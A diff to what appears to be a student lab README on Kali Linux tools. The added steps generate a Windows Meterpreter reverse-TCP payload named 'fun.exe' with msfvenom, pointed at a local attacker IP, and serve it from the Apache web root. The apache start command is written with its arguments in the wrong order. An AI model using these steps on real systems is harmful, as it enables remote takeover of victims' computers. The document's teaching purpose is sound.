@@ -21,8 +21,20 @@ Investigate on the various categories of tools as follows:
 
 Open terminal and try execute some kali linux commands
 
-## EXECUTION STEPS AND ITS OUTPUT:
+## PROGRAM:
 
+Find the attackers ip address using ifconfig
+## OUTPUT:
+
+![image](https://github.com/user-attachments/assets/0aefccb0-15b1-4319-8950-3bde65b867b1)
+Create a malicious executable file fun.exe using msfvenom command
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
+![image](https://github.com/user-attachments/assets/afa93003-0550-437f-af4b-556a420fa1c8)
+copy the fun.exe into the apache /var/www/html folder
+Start apache server
+sudo systemctl apache2 start
+![image](https://github.com/user-attachments/assets/42a365d9-0ae1-4572-a186-cd48d34f751e)
+Check the status of apache2
 
 
 ## RESULT:
